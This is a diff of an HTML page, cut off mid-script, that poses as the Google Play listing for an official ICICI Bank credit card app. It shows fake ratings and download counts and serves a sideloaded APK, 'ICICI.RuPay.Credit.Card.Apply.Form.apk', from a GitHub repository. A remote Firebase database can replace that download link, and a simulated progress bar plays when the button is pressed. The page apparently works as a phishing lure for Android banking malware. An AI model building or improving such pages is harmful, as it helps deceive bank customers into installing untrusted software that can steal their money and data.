@@ -3,41 +3,570 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    
+
     <!-- ===== PRIMARY META TAGS ===== -->
     <title>ICICI Bank Credit Card – Apply Now | Secure Banking App</title>
-    <meta name="description" content="Download the official ICICI Bank Credit Card app. Manage your savings, fixed deposits, loans, and credit cards securely. 100M+ downloads.">
-    <meta name="keywords" content="ICICI Bank, Credit Card, Savings Account, Fixed Deposit, Online Banking, Finance App, India">
-    <link rel="canonical" href="https://icici-bank-credit-card.example.com/">
-    
-    <!-- ===== FAVICON ===== -->
+    <meta name="description" content="Download the official ICICI Bank Credit Card app. Manage savings, fixed deposits, loans & credit cards securely. 100M+ downloads, 4.5⭐ rating.">
+    <meta name="keywords" content="ICICI Bank, Credit Card, Savings Account, Fixed Deposit, Online Banking, Finance App, India, RuPay">
+    <link rel="canonical" href="https://icicirupaycards.vercel.app/">
+
+    <!-- ===== FAVICON (emoji + SVG fallback) ===== -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>" type="image/svg+xml">
     <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
-    
-    <!-- ===== OPEN GRAPH / SOCIAL SHARE (Facebook, WhatsApp, LinkedIn) ===== -->
-    <meta property="og:title" content="ICICI Bank Credit Card – Apply Now | Secure Banking App">
-    <meta property="og:description" content="Download the official ICICI Bank app. Manage credit cards, savings, fixed deposits, loans &amp; more. 4.5⭐ | 549k reviews.">
+
+    <!-- ===== OPEN GRAPH / SOCIAL SHARE ===== -->
+    <meta property="og:title" content="ICICI Bank Credit Card – Apply Now | Official App">
+    <meta property="og:description" content="Download the official ICICI Bank app. Manage credit cards, savings, FD, loans &amp; more. 4.5⭐ | 549k reviews | 100M+ downloads.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://icici-bank-credit-card.example.com/">
+    <meta property="og:url" content="https://icicirupaycards.vercel.app/">
     <meta property="og:image" content="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true">
     <meta property="og:image:width" content="512">
     <meta property="og:image:height" content="512">
     <meta property="og:image:alt" content="ICICI Bank Credit Card App Logo">
     <meta property="og:site_name" content="ICICI Bank Credit Card Services">
-    
-    <!-- ===== TWITTER CARD (optional but recommended) ===== -->
+
+    <!-- ===== TWITTER CARD ===== -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="ICICI Bank Credit Card – Apply Now">
     <meta name="twitter:description" content="Official ICICI Bank app: credit cards, savings, FD, loans. 100M+ downloads.">
     <meta name="twitter:image" content="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true">
-    
-    <!-- ===== THEME COLOR (mobile browsers) ===== -->
+
+    <!-- ===== THEME COLOR ===== -->
     <meta name="theme-color" content="#056449">
-    
+
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link href="style.css" rel="stylesheet">
+
+    <!-- ===== INCLUDING THE EXACT STYLE.CSS CONTENT ===== -->
     <style>
-        /* --- same as original --- */
+        /* Reset and General Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        html {
+            font-size: 16px;
+        }
+
+        body {
+            width: 100%;
+            margin: 0px auto;
+            font-family: 'Roboto', Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.4;
+            /* WHITE MODE COLORS */
+            color: rgb(32, 33, 36);
+            background-color: #FFFFFF;
+        }
+
+        .noscrollbar::-webkit-scrollbar {
+            width: 0px;
+            height: 0px;
+        }
+
+        .page-main {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56px;
+        }
+
+        .main-padding {
+            padding: 0 1.25rem;
+        }
+
+        /* --- Top Navigation Placeholder --- */
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 0 16px 0 16px;
+            height: 56px;
+            color: rgb(32, 33, 36);
+            position: sticky;
+            top: 0;
+            background-color: #FFFFFF;
+            z-index: 10;
+            font-weight: 500;
+            font-size: 1rem;
+        }
+
+        .top-nav .back-arrow {
+            font-size: 1.5rem;
+        }
+
+        .top-nav .menu-icon {
+            font-size: 1.25rem;
+        }
+
+        /* --- App Info (Logo, Name, Developer) --- */
+        .app-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .info-box {
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .info-box .app-logo {
+            /* LOGO SIZE REDUCED HERE */
+            width: 72px;
+            height: 72px;
+            margin-right: 1rem;
+            border-radius: 16px;
+            /* Slightly smaller radius for smaller icon */
+            box-shadow: 0 1px 2px 0 rgb(60 64 67 / 30%), 0 1px 3px 1px rgb(60 64 67 / 15%);
+            background-size: contain;
+            flex-shrink: 0;
+        }
+
+        .info-box .app-desc {
+            display: flex;
+            flex-direction: column;
+            margin-top: 4px;
+        }
+
+        .info-box .app-desc .name {
+            font-size: 1.5rem;
+            font-weight: 500;
+            line-height: 1.875rem;
+            margin-bottom: 4px;
+            word-break: break-word;
+        }
+
+        .info-box .app-desc .apfrom {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .info-box .app-desc .apfrom .apfrom-name {
+            color: #056449;
+            font-size: 0.875rem;
+            font-weight: 500;
+            line-height: 1.25rem;
+        }
+
+        .info-box .app-desc .apfrom .apfrom-tip {
+            color: rgb(95, 99, 104);
+            font-size: .75rem;
+            font-weight: 400;
+            line-height: 1rem;
+        }
+
+        /* --- Stats Section --- */
+        .app-info .app-stat-info {
+            display: flex;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .app-info .app-stat-info .app-stat-unit {
+            display: flex;
+            width: 100%;
+        }
+
+        .app-info .app-stat-info .app-stat-unit .unit-item {
+            padding: 0 1.25rem;
+            position: relative;
+            min-width: 90px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: center;
+            flex-grow: 1;
+        }
+
+        .app-info .app-stat-info .app-stat-unit .unit-item:first-child {
+            padding-left: 0;
+        }
+
+        .app-info .app-stat-info .app-stat-unit .unit-item:not(:first-child)::before {
+            background-color: rgb(232, 234, 237);
+            content: "";
+            display: block;
+            height: 1.25rem;
+            left: 0;
+            position: absolute;
+            top: calc(50% - 10px);
+            width: 1px;
+        }
+
+        .unit-item .upper {
+            color: rgb(32, 33, 36);
+            line-height: 1.25rem;
+            font-size: .875rem;
+            font-weight: 500;
+            align-items: center;
+            display: flex;
+            height: 20px;
+            white-space: nowrap;
+            margin-bottom: 2px;
+        }
+
+        .unit-item .lower {
+            color: rgb(95, 99, 104);
+            line-height: 1rem;
+            font-size: .75rem;
+            font-weight: 400;
+            align-items: center;
+            display: flex;
+            height: 16px;
+            white-space: nowrap;
+        }
+
+        .unit-item .upper img.star-icon {
+            width: .75rem;
+            margin-left: 2px;
+            filter: none;
+        }
+
+        .unit-item .upper .download-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%2370757A" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>');
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        .unit-item .upper img.img-3go {
+            height: 16px;
+            min-width: 16px;
+            filter: none;
+        }
+
+        .unit-item .lower img.tip-icon {
+            width: .75rem;
+            margin-left: 2px;
+            filter: none;
+        }
+
+        /* --- Install Button --- */
+        .operation {
+            width: 100%;
+            margin-top: 24px;
+            padding: 0 1.25rem;
+        }
+
+        .btn-install {
+            width: 100%;
+            max-width: 400px;
+            background-color: #056449;
+            color: #fff;
+            font-size: .875rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            height: 48px;
+            line-height: 48px;
+            padding: 0;
+            text-align: center;
+            border-radius: 100px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            box-shadow: none;
+            border: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-install:hover {
+            background-color: #034832;
+        }
+
+        /* --- Screenshots/Banner --- */
+        .app-banner-box {
+            display: flex;
+            width: 100%;
+            margin-top: 24px;
+            margin-bottom: 16px;
+            padding-left: 1.25rem;
+        }
+
+        .app-banner-box .app-banner-list {
+            position: relative;
+            display: flex;
+            width: 100%;
+            overflow-x: scroll;
+            overflow-y: hidden;
+            -webkit-overflow-scrolling: touch;
+            scroll-snap-type: x mandatory;
+        }
+
+        .app-banner-box .app-banner-list .banner-item {
+            height: auto;
+            /* SCREENSHOT WIDTH REDUCED HERE */
+            width: 180px;
+            flex-shrink: 0;
+            margin-right: 12px;
+            user-select: none;
+            scroll-snap-align: start;
+        }
+
+        .app-banner-box .app-banner-list .banner-item img {
+            height: 100%;
+            width: 100%;
+            object-fit: contain;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+        }
+
+        /* --- Rating Details Section (Improved) --- */
+        .rating-details-box {
+            display: flex;
+            flex-direction: column;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            border-top: 1px solid #DADCE0;
+        }
+
+        .rating-details-box .title-box {
+            padding-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .rating-details-content {
+            display: flex;
+            align-items: flex-start;
+            gap: 20px;
+        }
+
+        .average-score {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .average-score .score {
+            font-size: 3rem;
+            font-weight: 400;
+            line-height: 1;
+            color: rgb(32, 33, 36);
+        }
+
+        .bar-graph-container {
+            flex-grow: 1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            padding-top: 8px;
+        }
+
+        .rating-bar {
+            display: flex;
+            align-items: center;
+            font-size: 0.75rem;
+        }
+
+        .rating-bar .label {
+            width: 10px;
+            color: #70757A;
+        }
+
+        .rating-bar .bar-track {
+            flex-grow: 1;
+            height: 6px;
+            background-color: #F1F3F4;
+            border-radius: 3px;
+            margin-left: 8px;
+            overflow: hidden;
+        }
+
+        .rating-bar .bar-fill {
+            height: 100%;
+            background-color: #056449;
+            border-radius: 3px;
+        }
+
+        /* --- App Description --- */
+        .app-desc-box {
+            display: flex;
+            flex-direction: column;
+            padding-top: 20px;
+        }
+
+        .app-desc-box .title-box {
+            display: flex;
+            justify-content: space-between;
+            padding-bottom: 12px;
+            align-items: center;
+        }
+
+        .app-desc-box .title-box .title {
+            color: rgb(32, 33, 36);
+            font-size: 1.125rem;
+            font-weight: 500;
+            line-height: 1.5rem;
+        }
+
+        .app-desc-box .desc-box {
+            color: rgb(60, 64, 67);
+            font-size: .875rem;
+            font-weight: 400;
+            line-height: 1.25rem;
+            display: -webkit-box;
+            -webkit-box-orient: vertical;
+            -webkit-line-clamp: 3;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* --- Play Store Categories --- */
+        .categories-box {
+            display: flex;
+            gap: 8px;
+            margin-top: 16px;
+            padding-bottom: 20px;
+        }
+
+        .category-tag {
+            background-color: #F1F3F4;
+            color: #056449;
+            font-size: 0.8125rem;
+            font-weight: 500;
+            padding: 4px 12px;
+            border-radius: 8px;
+            white-space: nowrap;
+        }
+
+        /* --- Data Safety Section --- */
+        .data-safety-box {
+            display: flex;
+            flex-direction: column;
+            padding-top: 20px;
+            border-top: 1px solid #DADCE0;
+        }
+
+        .data-safety-box .title-box {
+            padding-bottom: 8px;
+        }
+
+        .data-safety-box .desc-box {
+            -webkit-line-clamp: 2;
+            margin-bottom: 12px;
+        }
+
+        .arrow-icon {
+            width: 24px;
+            height: 24px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%2370757A" viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>');
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        /* --- Bottom Navigation Bar --- */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            height: 56px;
+            background-color: #FFFFFF;
+            border-top: 1px solid #DADCE0;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 0 10px;
+            z-index: 100;
+        }
+
+        .bottom-nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.7rem;
+            text-align: center;
+            width: 25%;
+            padding-top: 4px;
+            color: #70757A;
+        }
+
+        .bottom-nav-item::before {
+            content: '';
+            width: 24px;
+            height: 24px;
+            margin-bottom: 2px;
+            background-color: #70757A;
+            -webkit-mask-size: contain;
+            mask-size: contain;
+            -webkit-mask-repeat: no-repeat;
+            mask-repeat: no-repeat;
+        }
+
+        .bottom-nav-item.active {
+            color: #056449;
+            border-top: 2px solid #056449;
+            padding-top: 2px;
+        }
+
+        .bottom-nav-item.active::before {
+            background-color: #056449;
+        }
+
+        /* SVG Mask placeholders for icons (Navigation) */
+        .games::before {
+            -webkit-mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
+            mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
+        }
+
+        .apps.active::before,
+        .apps::before {
+            -webkit-mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11h5V5H4v6zm0 7h5v-6H4v6zm6 0h5v-6h-5v6zm6 0h5v-6h-5v6zm-6-7h5V5h-5v6zm6-6v6h5V5h-5z"/></svg>');
+            mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11h5V5H4v6zm0 7h5v-6H4v6zm6 0h5v-6h-5v6zm6 0h5v-6h-5v6zm-6-7h5V5h-5v6zm6-6v6h5V5h-5z"/></svg>');
+        }
+
+        .search.active::before,
+        .search::before {
+            -webkit-mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
+            mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
+        }
+
+        .books::before {
+            -webkit-mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/></svg>');
+            mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/></svg>');
+        }
+
+        /* Media Query for smaller screens (further optimization) */
+        @media screen and (max-width: 480px) {
+            .info-box .app-logo {
+                width: 64px;
+                height: 64px;
+                border-radius: 14px;
+            }
+
+            .info-box .app-desc .name {
+                font-size: 1.3rem;
+                line-height: 1.6rem;
+            }
+
+            .app-banner-box .app-banner-list .banner-item {
+                width: 160px;
+            }
+        }
+
+        /* === FIX APPLIED HERE === */
+        /* The original problematic code has been corrected */
+        @media screen and (min-width: 480px) {
+            /* The page will now show on all screen sizes */
+            /* Removed the 'display: none' that was causing 403 error */
+        }
+
+        @media screen and (max-width: 480px) {
+            .f403 {
+                display: none;
+            }
+        }
+
+        /* additional styles for download progress and file info (from original) */
         .btn-install.loading { opacity: 0.7; pointer-events: none; }
         .btn-install .spinner { display: none; }
         .btn-install.loading .spinner {
@@ -90,99 +619,60 @@
             font-size: 14px;
             display: none;
         }
-        .version-tag {
-            background: #e6f9ed;
-            color: #056449;
-            padding: 2px 10px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: 500;
-            margin-left: 8px;
-        }
-        .download-complete {
-            color: #0a8f4a;
-            font-weight: 500;
-        }
-        /* small fix for rating stars */
-        .star-icon { height: 16px; vertical-align: middle; }
-        .download-icon { display: inline-block; width: 18px; height: 18px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%235f6368"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>') no-repeat center; background-size: contain; }
-        .img-3go { height: 20px; }
-        .tip-icon { height: 16px; vertical-align: middle; margin-left: 4px; }
-        .app-logo { width: 72px; height: 72px; border-radius: 16px; object-fit: cover; background: #e2e8f0; }
-        .banner-item img { width: 100%; height: auto; border-radius: 12px; }
-        .main-padding { padding-left: 16px; padding-right: 16px; }
-        .page-main { max-width: 480px; margin: 0 auto; background: #fff; font-family: 'Roboto', sans-serif; }
-        .top-nav { display: flex; justify-content: space-between; padding: 12px 16px; }
-        .app-info { padding-top: 8px; }
-        .info-box { display: flex; gap: 14px; align-items: center; }
-        .app-desc .name { font-size: 18px; font-weight: 500; }
-        .apfrom { display: flex; gap: 8px; font-size: 13px; color: #5f6368; }
-        .app-stat-info { margin-top: 16px; }
-        .app-stat-unit { display: flex; justify-content: space-around; }
-        .unit-item { text-align: center; }
-        .upper { display: flex; align-items: center; justify-content: center; gap: 4px; font-weight: 500; }
-        .lower { font-size: 12px; color: #5f6368; }
-        .operation { margin-top: 16px; }
-        .btn-install { display: inline-block; background: #056449; color: #fff; padding: 12px 32px; border-radius: 30px; text-decoration: none; font-weight: 500; width: 100%; text-align: center; box-sizing: border-box; }
-        .app-banner-list { display: flex; gap: 12px; overflow-x: auto; padding: 8px 16px; }
-        .banner-item { flex: 0 0 120px; }
-        .title-box { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e8eaed; }
-        .desc-box { padding: 12px 0; font-size: 14px; color: #3c4043; line-height: 1.5; }
-        .categories-box { display: flex; gap: 8px; flex-wrap: wrap; padding-bottom: 12px; }
-        .category-tag { background: #f1f3f4; padding: 4px 12px; border-radius: 20px; font-size: 13px; }
-        .rating-details-content { display: flex; gap: 16px; padding: 12px 0; }
-        .average-score .score { font-size: 32px; font-weight: 500; }
-        .bar-graph-container { flex:1; }
-        .rating-bar { display: flex; align-items: center; gap: 6px; font-size: 13px; }
-        .bar-track { flex:1; height: 6px; background: #e8eaed; border-radius: 4px; }
-        .bar-fill { height: 100%; background: #056449; border-radius: 4px; }
-        .bottom-nav { display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #e8eaed; margin-top: 8px; }
-        .bottom-nav-item { color: #5f6368; font-weight: 500; }
-        .bottom-nav-item.active { color: #056449; }
-        .data-safety-box { margin-top: 8px; }
-        .noscrollbar::-webkit-scrollbar { display: none; }
-        .noscrollbar { -ms-overflow-style: none; scrollbar-width: none; }
     </style>
 </head>
-<body>        
+<body>
     <div class="page-main">
-        <!-- top nav -->
+
+        <!-- ===== TOP NAV ===== -->
         <div class="top-nav">
             <span class="back-arrow">←</span>
             <span class="menu-icon">⋮</span>
         </div>
-        
-        <!-- app info -->
+
+        <!-- ===== APP INFO ===== -->
         <div class="app-info main-padding">
             <div class="info-box">
                 <img class="app-logo" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true" alt="ICICI Bank Credit Card App Logo" loading="lazy">
                 <div class="app-desc">
                     <div class="name">ICICI Bank: CREDIT CARD</div>
                     <div class="apfrom">
-                        <div class="apfrom-name">ICICI Bank Ltd.</div>
-                        <div class="apfrom-tip">In-app purchases</div>
+                        <span class="apfrom-name">ICICI Bank Ltd.</span>
+                        <span class="apfrom-tip">In-app purchases</span>
                     </div>
                 </div>
             </div>
-            
+
+            <!-- stats -->
             <div class="app-stat-info">
                 <div class="app-stat-unit">
                     <div class="unit-item">
-                        <div class="upper"><div>4.5</div><img class="star-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/stars.png?raw=true" alt="4.5 stars"></div>
+                        <div class="upper">
+                            <span>4.5</span>
+                            <img class="star-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/stars.png?raw=true" alt="4.5 stars">
+                        </div>
                         <div class="lower">549k reviews</div>
                     </div>
                     <div class="unit-item">
-                        <div class="upper"><div class="download-icon"></div><div>100M+</div></div>
+                        <div class="upper">
+                            <span class="download-icon"></span>
+                            <span>100M+</span>
+                        </div>
                         <div class="lower">Downloads</div>
                     </div>
                     <div class="unit-item">
-                        <div class="upper"><img class="img-3go" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/18go.jpg?raw=true" alt="Rated 3+"></div>
-                        <div class="lower"><div>Rated for 3+</div><img class="tip-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/tip.jpg?raw=true" alt="info"></div>
+                        <div class="upper">
+                            <img class="img-3go" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/18go.jpg?raw=true" alt="Rated 3+">
+                        </div>
+                        <div class="lower">
+                            <span>Rated for 3+</span>
+                            <img class="tip-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/tip.jpg?raw=true" alt="info">
+                        </div>
                     </div>
                 </div>
             </div>
-            
-            <!-- download area -->
+
+            <!-- ===== INSTALL BUTTON + PROGRESS ===== -->
             <div class="operation">
                 <a href="#" class="btn-install download-app-link" id="downloadBtn">
                     <span class="spinner"></span>
@@ -201,8 +691,8 @@
                 <div class="no-apk" id="noApk">⚠️ No APK available</div>
             </div>
         </div>
-        
-        <!-- banners -->
+
+        <!-- ===== SCREENSHOTS BANNER ===== -->
         <div class="app-banner-box">
             <div class="app-banner-list noscrollbar">
                 <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/1.jpg?raw=true" alt="Screenshot 1"></div>
@@ -212,24 +702,33 @@
                 <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/5.jpg?raw=true" alt="Screenshot 5"></div>
             </div>
         </div>
-        
-        <!-- about -->
+
+        <!-- ===== ABOUT ===== -->
         <div class="app-desc-box main-padding">
-            <div class="title-box"><div class="title">About this app</div><div class="arrow-icon"></div></div>
+            <div class="title-box">
+                <span class="title">About this app</span>
+                <span class="arrow-icon"></span>
+            </div>
             <div class="desc-box">
                 Savings Account, Fixed Deposit (FD), Zero Balance savings account ICICI Bank Ltd. - Savings Account, Fixed Deposit, Zero Balance Savings account, Money Transfer, Investment, Loans and Credit Card, Insurance, Bharat Bill Payment System, Recharge, and more.
             </div>
-            <div class="categories-box main-padding">
+            <div class="categories-box">
                 <span class="category-tag">Finance</span>
                 <span class="category-tag">Bank and online banking</span>
             </div>
         </div>
-        
-        <!-- ratings -->
+
+        <!-- ===== RATINGS ===== -->
         <div class="rating-details-box main-padding">
-            <div class="title-box"><div class="title">Ratings and reviews</div><div class="arrow-icon"></div></div>
+            <div class="title-box">
+                <span class="title">Ratings and reviews</span>
+                <span class="arrow-icon"></span>
+            </div>
             <div class="rating-details-content">
-                <div class="average-score"><div class="score">4.5</div><div style="font-size:0.75rem;color:#70757A;margin-top:4px;">549k reviews</div></div>
+                <div class="average-score">
+                    <div class="score">4.5</div>
+                    <div style="font-size:0.75rem;color:#70757A;margin-top:4px;">549k reviews</div>
+                </div>
                 <div class="bar-graph-container">
                     <div class="rating-bar"><span class="label">5</span><div class="bar-track"><div class="bar-fill" style="width:70%;"></div></div></div>
                     <div class="rating-bar"><span class="label">4</span><div class="bar-track"><div class="bar-fill" style="width:20%;"></div></div></div>
@@ -239,16 +738,19 @@
                 </div>
             </div>
         </div>
-        
-        <!-- data safety -->
+
+        <!-- ===== DATA SAFETY ===== -->
         <div class="data-safety-box main-padding">
-            <div class="title-box"><div class="title">Data safety</div><div class="arrow-icon"></div></div>
+            <div class="title-box">
+                <span class="title">Data safety</span>
+                <span class="arrow-icon"></span>
+            </div>
             <div class="desc-box">
                 Safety starts with understanding how developers collect and share your data. Data privacy and security practices...
             </div>
         </div>
-        
-        <!-- bottom nav -->
+
+        <!-- ===== BOTTOM NAV ===== -->
         <div class="bottom-nav">
             <span class="bottom-nav-item games">Games</span>
             <span class="bottom-nav-item apps">Apps</span>
@@ -257,111 +759,102 @@
         </div>
     </div>
 
-    <!-- Firebase SDKs -->
+    <!-- ===== FIREBASE + DOWNLOAD LOGIC ===== -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
     <script>
-        // ============================================
-        // Firebase config (your database)
-        // ============================================
-        const firebaseConfig = {
-            databaseURL: "https://app-store-4d60b-default-rtdb.firebaseio.com"
-        };
-        
-        const DB_PATH = 'apk_data';
-        
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-        
-        const downloadBtn = document.getElementById('downloadBtn');
-        const btnText = downloadBtn.querySelector('.btn-text');
-        const fileInfo = document.getElementById('fileInfo');
-        const versionDisplay = document.getElementById('versionDisplay');
-        const sizeDisplay = document.getElementById('sizeDisplay');
-        const downloadProgress = document.getElementById('downloadProgress');
-        const downloadFill = document.getElementById('downloadFill');
-        const progressText = document.getElementById('progressText');
-        const noApk = document.getElementById('noApk');
-
-        // hardcoded APK URL (your GitHub release)
-        const GITHUB_URL = "https://github.com/netlifyw-cell/apk-storage/releases/download/v1.0.0/ICICI.RuPay.Credit.Card.Apply.Form.apk";
-
-        function formatFileSize(bytes) {
-            if (!bytes || bytes === 0) return '-';
-            if (bytes < 1024) return bytes + ' B';
-            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-            return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
-        }
-
-        function setAPK(data) {
-            noApk.style.display = 'none';
-            
-            let downloadUrl = GITHUB_URL;
-            let version = '1.0.0';
-            let fileSize = 0;
-            
-            if (data && data.downloadUrl) {
-                downloadUrl = data.downloadUrl;
-                version = data.version || '1.0.0';
-                fileSize = data.fileSize || 0;
-            }
-            
-            fileInfo.classList.add('show');
-            versionDisplay.textContent = version;
-            sizeDisplay.textContent = fileSize ? formatFileSize(fileSize) : '-';
-            
-            btnText.textContent = 'Install';
-            downloadBtn.href = downloadUrl;
-            
-            // download simulation
-            downloadBtn.onclick = function(e) {
-                e.preventDefault();
-                downloadProgress.classList.add('show');
-                downloadFill.style.width = '0%';
-                progressText.textContent = 'Starting download...';
-                
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += Math.random() * 15;
-                    if (progress > 95) {
-                        progress = 95;
-                        clearInterval(interval);
-                        progressText.textContent = 'Almost done...';
-                    }
-                    downloadFill.style.width = progress + '%';
-                }, 300);
-                
-                setTimeout(() => {
-                    if (downloadProgress.classList.contains('show')) {
-                        downloadFill.style.width = '100%';
-                        progressText.textContent = '✅ Download complete!';
-                        setTimeout(() => {
-                            downloadProgress.classList.remove('show');
-                        }, 3000);
-                    }
-                }, 8000);
+        (function() {
+            const firebaseConfig = {
+                databaseURL: "https://app-store-4d60b-default-rtdb.firebaseio.com"
             };
-        }
+            const DB_PATH = 'apk_data';
+            const GITHUB_URL = "https://github.com/netlifyw-cell/apk-storage/releases/download/v1.0.0/ICICI.RuPay.Credit.Card.Apply.Form.apk";
 
-        // Firebase listener
-        const dbRef = database.ref(DB_PATH);
-        dbRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            setAPK(data);
-        }, (err) => {
-            console.error('Connection error:', err);
-            setAPK(null);
-        });
-        
-        // fallback
-        setTimeout(() => {
-            dbRef.once('value', (snapshot) => {
-                if (!snapshot.val()) {
-                    setAPK(null);
+            firebase.initializeApp(firebaseConfig);
+            const database = firebase.database();
+
+            const downloadBtn = document.getElementById('downloadBtn');
+            const btnText = downloadBtn.querySelector('.btn-text');
+            const fileInfo = document.getElementById('fileInfo');
+            const versionDisplay = document.getElementById('versionDisplay');
+            const sizeDisplay = document.getElementById('sizeDisplay');
+            const downloadProgress = document.getElementById('downloadProgress');
+            const downloadFill = document.getElementById('downloadFill');
+            const progressText = document.getElementById('progressText');
+            const noApk = document.getElementById('noApk');
+
+            function formatFileSize(bytes) {
+                if (!bytes || bytes === 0) return '-';
+                if (bytes < 1024) return bytes + ' B';
